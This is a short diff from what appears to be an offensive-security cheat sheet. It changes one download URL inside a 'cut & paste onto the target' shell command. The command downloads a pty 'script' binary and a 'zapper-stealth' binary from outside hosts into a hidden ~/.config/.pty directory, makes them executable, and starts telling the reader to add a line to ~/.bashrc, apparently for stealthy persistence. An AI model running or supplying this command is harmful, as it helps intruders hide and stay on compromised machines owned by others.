@@ -1909,7 +1909,7 @@ Deploy: Cut & paste the following onto the target and follow the instructions:
 ```sh
 command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
-&& curl -o ~/.config/.pty/pty -fsSL "https://bin.ajam.dev/$(uname -m)/Baseutils/script" \
+&& curl -o ~/.config/.pty/pty -fsSL "https://bin.ajam.dev/$(uname -m)/Baseutils/util-linux/script" \
 && curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
 && chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
 && echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
